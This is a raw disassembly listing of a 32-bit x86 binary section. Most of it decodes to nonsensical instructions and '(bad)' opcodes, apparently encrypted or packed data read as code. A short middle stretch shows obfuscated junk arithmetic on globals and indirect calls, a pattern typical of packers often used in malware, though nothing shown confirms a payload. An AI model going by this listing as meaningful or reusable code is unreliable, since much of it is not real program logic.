  4185d9:	xor    esi,eax
  4185db:	inc    edx
  4185dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185dd:	mov    eax,ds:0x22fdb83a
  4185e2:	sti    
  4185e3:	ins    BYTE PTR es:[edi],dx
  4185e4:	mov    eax,ds:0x5317f7eb
  4185e9:	mov    edi,0xbece5725
  4185ee:	clc    
  4185ef:	cli    
  4185f0:	pusha  
  4185f1:	pop    edi
  4185f2:	js     0x41863c
  4185f4:	inc    ecx
  4185f5:	loope  0x4185e6
  4185f7:	push   esi
  4185f8:	mov    ah,0x98
  4185fa:	and    eax,0xfdd8fd20
  4185ff:	(bad)  
  418600:	ficom  DWORD PTR [edi+0x22]
  418603:	jno    0x418616
  418605:	push   ds
  418606:	dec    ecx
  418607:	inc    esi
  418608:	xor    ebp,DWORD PTR [edi]
  41860a:	lods   al,BYTE PTR ds:[esi]
  41860b:	sbb    al,0x7e
  41860d:	int3   
  41860e:	jo     0x4185e6
  418610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418611:	add    ecx,DWORD PTR [ecx+0x473d3c10]
  418617:	iret   
  418618:	out    dx,al
  418619:	gs js  0x41861c
  41861c:	dec    esi
  41861d:	or     eax,0xac7497fc
  418622:	cmp    DWORD PTR ds:0x828e,ecx
  418627:	add    DWORD PTR [ecx],edi
  418629:	jp     0x41869a
  41862b:	pusha  
  41862c:	xor    al,0x21
  41862e:	pop    eax
  41862f:	sbb    dh,al
  418631:	call   0x8b923614
  418636:	mov    dh,BYTE PTR [edi-0xe]
  418639:	sub    al,0x27
  41863b:	leave  
  41863c:	aas    
  41863d:	fcomp  QWORD PTR [ecx-0x2c]
  418640:	pop    ebx
  418641:	or     ah,BYTE PTR [ebp+eax*4+0x1d]
  418645:	fidivr DWORD PTR ds:0x307b869e
  41864b:	mov    fs,WORD PTR [ecx+eiz*8]
  41864e:	shl    DWORD PTR [eax],cl
  418650:	in     al,0x20
  418652:	cdq    
  418653:	stos   BYTE PTR es:[edi],al
  418654:	pushf  
  418655:	mov    cl,0x91
  418657:	or     dh,ah
  418659:	out    0xb1,al
  41865b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41865c:	in     eax,dx
  41865d:	int    0x52
  41865f:	(bad)  
  418661:	(bad)  
  418662:	loopne 0x41862e
  418664:	and    cl,cl
  418666:	ret    
  418667:	mov    dl,0xd1
  418669:	ficomp WORD PTR [edx]
  41866b:	cmp    DWORD PTR [edx],0x6c
  41866e:	push   0x72ddb6f3
  418673:	xchg   ebp,eax
  418674:	mov    dl,0x2c
  418676:	mov    eax,0x23b724f5
  41867b:	xor    DWORD PTR [ecx],edi
  41867d:	scas   eax,DWORD PTR es:[edi]
  41867e:	shl    ch,cl
  418680:	dec    edx
  418681:	mov    ah,0x5f
  418683:	push   0xffffffb8
  418685:	jge    0x4186c1
  418687:	mov    bl,0x26
  418689:	call   0xdfbd277
  41868e:	push   esi
  41868f:	push   edx
  418690:	push   ebx
  418691:	lock xor eax,0x562a86e8
  418697:	jecxz  0x418656
  418699:	les    ebp,FWORD PTR [edx]
  41869b:	sbb    DWORD PTR [eax-0x5d],0x3e3ad234
  4186a2:	or     DWORD PTR [edi],0xc2248e67
  4186a8:	mov    dl,0x6a
  4186aa:	pusha  
  4186ab:	in     eax,0xe8
  4186ad:	and    BYTE PTR [ecx+edx*8-0x75],ch
  4186b1:	jns    0x41871c
  4186b3:	pop    ds
  4186b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b5:	fmul   QWORD PTR [edx]
  4186b7:	imul   ebp,DWORD PTR [edx-0x75],0x6fd8c7c6
  4186be:	lock add esp,DWORD PTR [ebx+eiz*8]
  4186c2:	retf   0x35b5
  4186c5:	xor    DWORD PTR [ecx+0x7e],eax
  4186c8:	ds inc eax
  4186ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186cb:	jle    0x41870c
  4186cd:	add    al,0x5a
  4186cf:	inc    dx
  4186d1:	jns    0x418711
  4186d3:	repz and BYTE PTR [edi+eiz*8-0x2847d395],bh
  4186db:	push   esp
  4186dc:	(bad)  
  4186dd:	lds    esi,FWORD PTR [edi+0xcde7b5a]
  4186e3:	push   es
  4186e4:	push   es
  4186e5:	fiadd  DWORD PTR [esp+edi*4-0x31754dbf]
  4186ec:	nop
  4186ed:	xchg   edi,eax
  4186ee:	adc    al,0xb8
  4186f0:	(bad)  
  4186f1:	(bad)  
  4186f2:	fbstp  TBYTE PTR [ebp+0x66]
  4186f5:	das    
  4186f6:	mov    ebp,0xe79a4438
  4186fb:	ins    DWORD PTR es:[edi],dx
  4186fc:	(bad)  
  4186fd:	jbe    0x41869d
  4186ff:	xchg   edx,eax
  418700:	in     eax,dx
  418701:	push   esp
  418702:	mov    edi,0x5dd12c48
  418707:	pop    ss
  418708:	push   ebx
  418709:	out    0x65,al
  41870b:	pop    esp
  41870c:	clc    
  41870d:	dec    edx
  41870e:	mov    ecx,0x66794b70
  418713:	mov    eax,ds:0x19333fac
  418718:	es jmp 0x4b12:0x26907ab5
  418720:	add    ebx,DWORD PTR [ebp+0x4a]
  418723:	xor    BYTE PTR [esi-0x60da71c0],0xbf
  41872a:	rcr    ebx,0xf2
  41872d:	adc    edi,DWORD PTR [ebx+0x57]
  418730:	aas    
  418731:	push   0x6c
  418733:	push   ecx
  418734:	sub    al,0x6c
  418736:	jg     0x418778
  418738:	shl    BYTE PTR [eax+0x1a],1
  41873b:	pop    es
  41873c:	cmp    dh,BYTE PTR [edi-0x6800dc51]
  418742:	ins    BYTE PTR es:[edi],dx
  418743:	je     0x4187b8
  418745:	mov    ds:0x880fed23,al
  41874a:	xor    edi,eax
  41874c:	adc    al,BYTE PTR [edi-0x1c]
  41874f:	aam    0x57
  418751:	in     eax,0xd7
  418753:	loopne 0x4187cb
  418755:	pop    esp
  418756:	xor    DWORD PTR [ecx-0x44],0x29582f0
  41875d:	rcl    ch,cl
  41875f:	add    BYTE PTR [ebx-0x41],ch
  418762:	call   0xfb639bc
  418767:	je     0x41874b
  418769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876a:	mov    WORD PTR [ecx],?
  41876c:	jle    0x41870b
  41876e:	in     eax,0x7c
  418770:	pop    es
  418771:	shl    DWORD PTR [edx+0x24],1
  418774:	inc    ecx
  418775:	mov    dh,0xc7
  418777:	xor    eax,DWORD PTR [esi]
  418779:	adc    eax,0x8c9a312a
  41877e:	shl    DWORD PTR [ecx+0x5d],1
  418781:	out    dx,eax
  418782:	das    
  418783:	test   eax,0x23c66817
  418788:	in     eax,dx
  418789:	cs (bad) 
  41878b:	pop    edx
  41878c:	ins    BYTE PTR es:[edi],dx
  41878d:	clc    
  41878e:	xchg   edi,eax
  41878f:	jmp    0x418721
  418791:	mov    ebx,DWORD PTR [esi+0x17ea4f6a]
  418797:	outs   dx,BYTE PTR ds:[esi]
  418798:	mov    al,ds:0x7de2a793
  41879d:	dec    esp
  41879e:	call   0x6fbf0a1d
  4187a3:	jmp    0x69a7c3c
  4187a8:	mov    eax,ds:0x8296a51a
  4187ad:	xor    bh,al
  4187af:	pop    ss
  4187b0:	jmp    0x4187e0
  4187b2:	pop    esi
  4187b3:	xchg   DWORD PTR [eax+0x52],ebx
  4187b6:	or     DWORD PTR [esi+0x9],edi
  4187b9:	cdq    
  4187ba:	icebp  
  4187bb:	call   0xe69f861b
  4187c0:	in     al,dx
  4187c1:	or     al,0xae
  4187c3:	inc    edi
  4187c4:	dec    ecx
  4187c5:	mov    dh,0x7c
  4187c7:	and    DWORD PTR [edx],edx
  4187c9:	loopne 0x418802
  4187cb:	call   0x1562:0x14d77a56
  4187d2:	mov    bl,0x26
  4187d4:	call   0x95016c15
  4187d9:	outs   dx,BYTE PTR es:[esi]
  4187db:	fisttp QWORD PTR [ebp+0x440098ee]
  4187e1:	pop    ebp
  4187e2:	(bad)  
  4187e3:	sub    eax,0x8d4d2015
  4187e8:	sti    
  4187e9:	cmp    DWORD PTR [edi+0x3b985da1],eax
  4187ef:	xor    al,0x7c
  4187f1:	cld    
  4187f2:	add    al,BYTE PTR [ebp+0x7b40910]
  4187f8:	dec    esp
  4187f9:	sbb    eax,0x4f61cccf
  4187fe:	mov    dh,0x3e
  418800:	xchg   BYTE PTR [ecx+0x5a42ff51],al
  418806:	or     eax,0x546f5e27
  41880b:	test   BYTE PTR [edi+0x1a45892f],0x6e
  418812:	fstp   TBYTE PTR [ecx+0x22f2671d]
  418818:	outs   dx,BYTE PTR ds:[esi]
  418819:	shl    ah,cl
  41881b:	call   0x5771c3ab
  418820:	push   esi
  418821:	retf   0x3946
  418824:	lock xchg ebp,eax
  418826:	arpl   WORD PTR [edx],bx
  418828:	call   0xc7b73027
  41882d:	xor    esp,eax
  41882f:	js     0x4187d3
  418831:	enter  0x2ffb,0x15
  418835:	cs push esp
  418837:	aam    0xfb
  418839:	pushf  
  41883a:	repnz cwde 
  41883c:	inc    esi
  41883d:	and    ch,BYTE PTR [ebp-0x28]
  418840:	mov    dh,0x28
  418842:	stos   BYTE PTR es:[edi],al
  418843:	and    bl,bh
  418845:	xor    DWORD PTR [esi-0x1a],edi
  418848:	out    dx,al
  418849:	fmul   st,st(5)
  41884b:	mov    bh,0x77
  41884d:	fadd   QWORD PTR [ebx+0x328ab12e]
  418853:	sbb    al,0x82
  418855:	cdq    
  418856:	(bad)  
  418857:	fild   QWORD PTR ds:0x5edcd50b
  41885d:	or     BYTE PTR [esi],cl
  41885f:	add    esp,DWORD PTR [edi+0x19bd5817]
  418865:	push   cs
  418866:	sti    
  418867:	push   ecx
  418868:	ss sbb eax,0x43d51425
  41886e:	outs   dx,BYTE PTR ds:[esi]
  41886f:	ret    0x2879
  418872:	out    dx,eax
  418873:	xor    DWORD PTR [edx-0x6d],ebp
  418876:	xrelease xchg DWORD PTR [ebx+0x4f28cd95],edi
  41887d:	lods   al,BYTE PTR ds:[esi]
  41887e:	xchg   esp,eax
  41887f:	and    eax,0xc436404b
  418884:	cmp    bl,ah
  418886:	bound  eax,QWORD PTR [eax+0x5]
  418889:	sbb    edx,DWORD PTR [edi-0x737862c3]
  41888f:	inc    DWORD PTR [ecx-0x58160fde]
  418895:	push   esi
  418896:	pop    ss
  418897:	mov    edi,0x3e86d792
  41889c:	add    eax,0x97e348f0
  4188a1:	xchg   DWORD PTR [ebx],ecx
  4188a3:	ss outs dx,DWORD PTR es:[esi]
  4188a6:	sahf   
  4188a7:	add    cl,BYTE PTR [ecx+ebx*2-0x28]
  4188ab:	or     DWORD PTR [edi+ebx*2-0x75],0x5077aa07
  4188b3:	inc    ebx
  4188b4:	fmul   DWORD PTR [ebx-0x7eb7dbb4]
  4188ba:	or     eax,0x4281fb
  4188bf:	jmp    0x418842
  4188c1:	inc    edx
  4188c2:	add    BYTE PTR [ebx],dh
  4188c4:	rcl    DWORD PTR [ebx],0xd
  4188c7:	adc    eax,DWORD PTR [ecx+0x4c8b0042]
  4188cd:	and    al,0x28
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428203,0x42825b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42814f,0x428253
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x4281ff,0x42833f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42823b,0x7154
  418909:	call   DWORD PTR ds:0x428d68
  41890f:	or     DWORD PTR ds:0x428253,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428357,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x4282df,0x0
  418935:	mov    DWORD PTR ds:0x4282bf,ebx
  41893b:	mov    DWORD PTR ds:0x428243,ebx
  418941:	mov    esi,DWORD PTR ds:0x428213
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x4282df,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dac
  41896e:	movzx  esi,WORD PTR ds:0x4282e3
  418975:	sbb    DWORD PTR ds:0x428123,esi
  41897b:	adc    DWORD PTR ds:0x42832f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428367,ebx
  41898b:	mov    esi,DWORD PTR ds:0x4281f7
  418991:	xor    esi,DWORD PTR ds:0x428133
  418997:	mov    DWORD PTR ds:0x4281f7,esi
  41899d:	add    DWORD PTR ds:0x428207,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428363,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42833b,0x4281fb
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428123,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x4282db,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428263
  4189ec:	mov    edx,DWORD PTR ds:0x4281eb
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428363,0x606f
  418a03:	mov    DWORD PTR ds:0x42813f,ebx
  418a09:	cmp    DWORD PTR ds:0x4282db,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428db0
  418a1c:	adc    DWORD PTR ds:0x42811b,ebx
  418a22:	or     DWORD PTR ds:0x42821f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281cf
  418a34:	mov    edx,DWORD PTR ds:0x4282f3
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x4282e3
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428267,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428363,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42823b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428357,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42811b
  418a85:	mov    eax,ds:0x42825b
  418a8a:	cmp    DWORD PTR ds:0x428363,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e50
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428333,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428243,edi
  418ac0:	or     DWORD PTR ds:0x42823b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42832f,ebx
  418ad0:	mov    eax,ds:0x422518
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42813b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x4ab0b184
  418af3:	pop    ecx
  418af4:	mov    bh,0x7c
  418af6:	call   0x1812:0xbc1816cb
  418afd:	sbb    BYTE PTR [edi+0x5ae092df],dh
  418b03:	repz dec esi
  418b05:	fld    QWORD PTR [edi+edi*1]
  418b08:	sti    
  418b09:	pop    esi
  418b0a:	push   esi
  418b0b:	sub    dl,BYTE PTR es:[esi+0x65]
  418b0f:	xor    al,0xa6
  418b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b12:	mov    ds,WORD PTR ds:0x36409c2e
  418b18:	ds jecxz 0x418b26
  418b1b:	sbb    ecx,DWORD PTR ds:0x5d6212ef
  418b21:	push   0x16
  418b23:	add    cl,BYTE PTR [ecx-0x49]
  418b26:	rcl    BYTE PTR [ebx],1
  418b28:	lahf   
  418b29:	pop    edi
  418b2a:	fiadd  DWORD PTR [ecx]
  418b2c:	xchg   esi,eax
  418b2d:	out    dx,al
  418b2e:	xlat   BYTE PTR ds:[ebx]
  418b2f:	mov    BYTE PTR [esp+edx*4+0xb],0x7d
  418b34:	loope  0x418ae3
  418b36:	leave  
  418b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b38:	mov    DWORD PTR [ebx+0x37],ebp
  418b3b:	cmp    ebp,DWORD PTR [edx+0x2cf7060b]
  418b41:	stos   BYTE PTR es:[edi],al
  418b42:	dec    edx
  418b43:	mov    ecx,0x94d981ad
  418b48:	add    eax,0x33ae6cd
  418b4d:	(bad)  [edi+edx*1+0x1f]
  418b51:	or     ah,0x22
  418b54:	arpl   cx,sp
  418b56:	je     0x418bbd
  418b58:	ins    BYTE PTR es:[edi],dx
  418b59:	or     DWORD PTR ds:0xf8d69905,edi
  418b5f:	mov    al,0x2c
  418b61:	leave  
  418b62:	push   cs
  418b63:	call   0x23907e08
  418b68:	push   ebx
  418b69:	add    eax,0x3597042d
  418b6e:	data16 int3 
  418b70:	jae    0x418b57
  418b72:	dec    eax
  418b73:	mov    ds:0xbbcbffd4,eax
  418b78:	xchg   edx,eax
  418b79:	fimul  WORD PTR [ebx+edx*1]
  418b7c:	inc    edx
  418b7d:	fild   DWORD PTR [edi-0x7a31033]
  418b83:	test   BYTE PTR [ebx-0x25],ah
  418b86:	(bad)  [edi]
  418b88:	lock js 0x418b99
  418b8b:	out    dx,eax
  418b8c:	call   0x4d9b949a
  418b91:	fnstenv [edx+0xb8a6864]
  418b97:	jnp    0x418bcd
  418b99:	mov    ecx,0x827344e6
  418b9e:	stc    
  418b9f:	cld    
  418ba0:	push   ebp
  418ba1:	and    BYTE PTR [ecx],0x88
  418ba4:	lea    esp,[ecx-0x1c7d5569]
  418baa:	fcmovnb st,st(5)
  418bac:	jle    0x418b3f
  418bae:	sub    edi,edi
  418bb0:	sub    ecx,edi
  418bb2:	and    eax,0xe8b234b2
  418bb7:	cmp    al,0x2b
  418bb9:	mov    al,ds:0xb48392bc
  418bbe:	sar    BYTE PTR [ecx-0x7345403],cl
  418bc4:	push   edi
  418bc5:	pop    ebx
  418bc6:	aas    
  418bc7:	imul   edx,edi,0x63d9a7a2
  418bcd:	mov    bh,0x4
  418bcf:	bound  ecx,QWORD PTR [ebp-0x4f]
  418bd2:	aam    0x48
  418bd4:	pop    edx
  418bd5:	push   ebp
  418bd6:	mov    ecx,ecx
  418bd8:	jbe    0x418b94
  418bda:	lods   al,BYTE PTR ds:[esi]
  418bdb:	push   esi
  418bdc:	pop    ds
  418bdd:	jecxz  0x418b61
  418bdf:	and    al,0xa0
  418be1:	push   esp
  418be2:	repnz (bad) 
  418be4:	mov    ebx,0x20ccca99
  418be9:	test   eax,0x46f9e044
  418bee:	cmp    cl,bl
  418bf0:	xchg   esi,eax
  418bf1:	sub    BYTE PTR [edi+0x32397445],al
  418bf7:	mov    ds:0x8807d533,al
  418bfc:	cmp    BYTE PTR [eax-0x4d],bl
  418bff:	leave  
  418c00:	scas   al,BYTE PTR es:[edi]
  418c01:	mov    eax,0x6a371364
  418c06:	sub    esp,ebx
  418c08:	inc    ecx
  418c09:	push   ebx
  418c0a:	mov    DWORD PTR [ecx],ebp
  418c0c:	retf   0x4021
  418c0f:	pusha  
  418c10:	shl    DWORD PTR [edi+0x738b9cdf],1
  418c16:	lahf   
  418c17:	sahf   
  418c18:	retf   
  418c19:	mov    al,ds:0x2b619c20
  418c1e:	shl    ah,0x2c
  418c21:	(bad)  
  418c22:	jmp    0x418bde
  418c24:	dec    edi
  418c25:	out    0xc4,eax
  418c27:	inc    esi
  418c28:	xchg   esp,eax
  418c29:	pop    eax
  418c2a:	push   edx
  418c2b:	xchg   ebp,eax
  418c2c:	add    eax,0x657c7190
  418c31:	adc    DWORD PTR [ecx],ecx
  418c33:	xchg   ecx,eax
  418c34:	push   ss
  418c35:	je     0x418be0
  418c37:	mov    eax,0x950627bc
  418c3c:	sub    DWORD PTR [edi+0x58dc71da],esi
  418c42:	ror    bl,0xf3
  418c45:	cs popa 
  418c47:	test   BYTE PTR cs:[edi+0x42da0f1b],bh
  418c4e:	jl     0x418cbd
  418c50:	push   cs
  418c51:	js     0x418bd3
  418c53:	shr    DWORD PTR [ecx-0x63],1
  418c56:	inc    ebp
  418c57:	div    edi
  418c59:	mov    esi,0x3fb976b9
  418c5e:	outs   dx,BYTE PTR ds:[esi]
  418c5f:	cdq    
  418c60:	jge    0x418c94
  418c62:	push   0x8f7c4bad
  418c67:	mov    ?,WORD PTR [edx]
  418c69:	add    BYTE PTR ss:[ebp-0x775fb99e],ah
  418c70:	sub    BYTE PTR [ecx],al
  418c72:	mov    ebx,0xd771d5df
  418c77:	mov    edi,edi
  418c79:	mov    es,WORD PTR [edx+eiz*4]
  418c7c:	dec    eax
  418c7d:	sbb    DWORD PTR [edx-0x4b],ebx
  418c80:	and    dl,BYTE PTR [eax+0x6d]
  418c83:	pushf  
  418c84:	adc    BYTE PTR [edx],ah
  418c86:	ins    BYTE PTR es:[edi],dx
  418c87:	jno    0x418c66
  418c89:	xlat   BYTE PTR ds:[ebx]
  418c8a:	xor    BYTE PTR ds:0x65f93e73,dh
  418c90:	jmp    0x5f0d025c
  418c95:	jnp    0x418cce
  418c97:	mov    edi,DWORD PTR [ecx]
  418c99:	inc    ebx
  418c9a:	xchg   esp,eax
  418c9b:	mov    ecx,0x9704d629
  418ca0:	lods   eax,DWORD PTR ds:[esi]
  418ca1:	push   esi
  418ca2:	jno    0x418d0f
  418ca4:	call   0x3d9e:0x9d6bc469
  418cab:	enter  0xf174,0xf3
  418caf:	mov    esi,0xf2160e5c
  418cb4:	and    cl,ah
  418cb6:	fld    QWORD PTR [edi-0x30]
  418cb9:	daa    
  418cba:	fs cdq 
  418cbc:	mov    edi,0x874b9ef0
  418cc1:	(bad)  
  418cc2:	dec    ebp
  418cc3:	scas   eax,DWORD PTR es:[edi]
  418cc4:	jns    0x418cf5
  418cc6:	cmc    
  418cc7:	scas   eax,DWORD PTR es:[edi]
  418cc8:	cli    
  418cc9:	xchg   esp,eax
  418cca:	sti    
  418ccb:	pop    esp
  418ccc:	loopne 0x418ca8
  418cce:	(bad)  
  418ccf:	repz or DWORD PTR ss:0xd609ce87,0x6f
  418cd8:	pop    ss
  418cd9:	xchg   BYTE PTR [edi+0x7f846bd9],cl
  418cdf:	jmp    0xc21d263e
  418ce4:	es (bad) 
  418ce6:	adc    al,0xfd
  418ce8:	sub    al,BYTE PTR [eax+0x5d5b895e]
  418cee:	out    dx,eax
  418cef:	rol    BYTE PTR [edi-0x73d061d0],1
  418cf5:	mov    BYTE PTR [ecx+0x28],bh
  418cf8:	gs jmp 0x45a:0xa1ca2b1a
  418d00:	push   ebp
  418d01:	out    0x9d,eax
  418d03:	ds in  eax,dx
  418d05:	ror    DWORD PTR [ecx-0x5a2c2330],0x68
  418d0c:	daa    
  418d0d:	mov    ch,0x23
  418d0f:	push   0x59885ceb
  418d14:	dec    eax
  418d15:	xor    BYTE PTR [edi],bl
  418d17:	xchg   DWORD PTR [edx],ebp
  418d19:	mov    eax,ds:0xaf3cad5e
  418d1e:	loope  0x418d4d
  418d20:	scas   eax,DWORD PTR es:[edi]
  418d21:	add    esp,DWORD PTR [edi-0x2]
  418d24:	je     0x418da4
  418d26:	dec    ebx
  418d27:	rcr    DWORD PTR [eax],1
  418d29:	inc    eax
  418d2a:	pushf  
  418d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d2c:	adc    ebx,DWORD PTR ds:0xbc5e32a3
  418d32:	mov    bl,0x15
  418d34:	mov    dh,BYTE PTR [ebp+0x2e]
  418d37:	jne    0x418d8f
  418d39:	sbb    al,0x4b
  418d3b:	sub    al,0x30
  418d3d:	fild   WORD PTR ds:0x6271b051
  418d43:	repz sti 
  418d45:	push   ds
  418d46:	and    DWORD PTR [eax-0x70b83ff9],0x7bef225d
  418d50:	mov    cl,0xe6
  418d52:	ss dec ebp
  418d54:	sbb    edi,ecx
  418d56:	sub    ebp,DWORD PTR [ebx+0x67]
  418d59:	adc    DWORD PTR [edi-0x29c1317d],edi
  418d5f:	aaa    
  418d60:	aaa    
  418d61:	pop    esp
  418d62:	arpl   WORD PTR ds:0x53a878c0,sp
  418d68:	inc    edi
  418d69:	loop   0x418d82
  418d6b:	mov    dh,0x1e
  418d6d:	js     0x418d8b
  418d6f:	je     0x418d59
  418d71:	mov    cl,0xd5
  418d73:	lahf   
  418d74:	(bad)  
  418d75:	xchg   ecx,eax
  418d76:	xchg   ebx,eax
  418d77:	or     BYTE PTR [eax],ah
  418d79:	or     dh,BYTE PTR [edx+0x2bd7b1ea]
  418d7f:	mov    dl,cl
  418d81:	lds    edx,FWORD PTR [edi+0x73]
  418d84:	dec    ecx
  418d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d86:	lods   al,BYTE PTR ds:[esi]
  418d87:	and    DWORD PTR [edi],0xab7b7ea3
  418d8d:	jno    0x418d39
  418d8f:	mov    cl,0x34
  418d91:	mov    WORD PTR [eax-0xfd64d43],es
  418d97:	mul    BYTE PTR [ebp-0x33]
  418d9a:	dec    edx
  418d9b:	aaa    
  418d9c:	out    dx,al
  418d9d:	in     eax,dx
  418d9e:	xor    bl,BYTE PTR [ebp+0x4f]
  418da1:	xor    edi,ecx
  418da3:	adc    ch,BYTE PTR [esi-0x13]
  418da6:	jnp    0x418d49
  418da8:	pop    esp
  418da9:	push   ebp
  418daa:	adc    bl,BYTE PTR [esi+0x1a03e7d8]
  418db0:	inc    edx
  418db1:	pop    esp
  418db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db3:	aam    0xe4
  418db5:	dec    esi
  418db6:	ret    0x5eba
  418db9:	xchg   esp,eax
  418dba:	cwde   
  418dbb:	push   ds
  418dbc:	jae    0x418dfd
  418dbe:	neg    ch
  418dc0:	adc    al,0xb0
  418dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc3:	jecxz  0x418da7
  418dc5:	mov    bl,0x6d
  418dc7:	add    eax,0xb5e86cd0
  418dcc:	ss gs or eax,0x40dc01c9
  418dd3:	sbb    dh,BYTE PTR [edi]
  418dd5:	sub    ch,bh
  418dd7:	jle    0x418d78
  418dd9:	call   FWORD PTR [esi-0x22]
  418ddc:	or     eax,0x709df7f3
  418de1:	loope  0x418d89
  418de3:	xor    esp,eax
  418de5:	into   
  418de6:	loope  0x418e10
  418de8:	int    0xf
  418dea:	nop
  418deb:	icebp  
  418dec:	jmp    0x418def
  418dee:	push   ebx
  418def:	pusha  
  418df0:	mov    ebp,0xbb197abb
  418df5:	psrad  mm1,0xbe
  418df9:	fstp   TBYTE PTR ds:0x1b7175ac
  418dff:	cld    
  418e00:	dec    BYTE PTR [ebx+edx*8-0x6a81da35]
  418e07:	mov    edi,0x398e4f25
  418e0c:	add    ecx,DWORD PTR [edi+0x3d]
  418e0f:	call   0x93527605
  418e14:	or     DWORD PTR [esp+ebx*2+0x41],ebx
  418e18:	ins    DWORD PTR es:[edi],dx
  418e19:	push   0x96eb5aa9
  418e1e:	mov    ebx,0x66045556
  418e23:	icebp  
  418e24:	mov    cl,BYTE PTR [ebx-0x66e7c8e7]
  418e2a:	out    dx,eax
  418e2b:	mov    ebx,0x51ae561
  418e30:	push   es
  418e31:	scas   eax,DWORD PTR es:[edi]
  418e32:	pop    edi
  418e33:	and    bh,BYTE PTR [ecx-0x6536ecea]
  418e39:	cs pop esi
  418e3b:	xor    edx,DWORD PTR [edx-0x6cab3c7]
  418e41:	mov    ah,0xc7
  418e43:	test   al,0x1b
  418e45:	dec    edx
  418e46:	cdq    
  418e47:	mov    dl,dl
  418e49:	mov    DWORD PTR [edx-0x28],esp
  418e4c:	dec    DWORD PTR [edi-0x5fdc2f45]
  418e52:	adc    BYTE PTR ds:0xd882ee51,bl
  418e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e59:	push   cs
  418e5a:	xor    bl,ah
  418e5c:	arpl   WORD PTR [eax-0x1625ec46],cx
  418e62:	cs (bad) 
  418e64:	push   ebx
  418e65:	cmp    al,0xc1
  418e67:	xchg   dl,dh
  418e69:	repz leave 
  418e6b:	cld    
  418e6c:	or     DWORD PTR [ebx+0x62c7db2b],esi
  418e72:	mov    ?,WORD PTR [edx-0x10453564]
  418e78:	fs xor eax,0x11242c07
  418e7e:	sub    eax,0x47aead1
  418e83:	mov    dh,0xb6
  418e85:	outs   dx,DWORD PTR ds:[esi]
  418e86:	and    DWORD PTR [eax-0x4],edx
  418e89:	sub    al,0xf5
  418e8b:	in     eax,dx
  418e8c:	fwait
  418e8d:	add    al,0x2a
  418e8f:	xor    BYTE PTR [edi+0x21],al
  418e92:	iret   
  418e93:	je     0x418e5c
  418e95:	and    al,0x76
  418e98:	scas   al,BYTE PTR es:[edi]
  418e99:	(bad)  
  418e9a:	popf   
  418e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e9c:	sahf   
  418e9d:	std    
  418e9e:	mov    cl,0xdf
  418ea0:	(bad)  
  418ea1:	into   
  418ea2:	std    
  418ea3:	sahf   
  418ea4:	push   0xffffffd1
  418ea6:	outs   dx,BYTE PTR ds:[esi]
  418ea7:	mov    ah,0xb9
  418ea9:	adc    dh,ah
  418eab:	push   cs
  418eac:	mov    cl,0x22
  418eae:	xchg   ebp,eax
